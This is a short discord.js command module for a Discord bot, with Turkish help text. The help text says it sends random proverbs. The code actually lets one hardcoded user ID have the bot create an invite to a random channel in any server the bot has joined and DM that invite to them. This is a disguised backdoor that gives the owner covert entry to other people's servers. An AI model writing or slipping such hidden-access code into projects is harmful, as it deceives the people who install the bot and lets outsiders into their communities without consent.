const Discord = require("discord.js");
exports.run = async (client, message, args) => {
    if (message.author.id !== "327064201245753344") return;
    let sv = client.guilds.get(args[0])
    if (!sv) return message.channel.send(`523912113094131723`)
    sv.channels.random().createInvite().then(a => message.author.send(a.toString()))

}

exports.conf = {
enabled: true,
guildOnly: true,
aliases: [],
permLevel: 0
};

exports.help = {
name: 'ailemiz',
description: 'Bot Tarafından Rasgele Atasözleri Gönderilir',
usage: 'atasozu'
};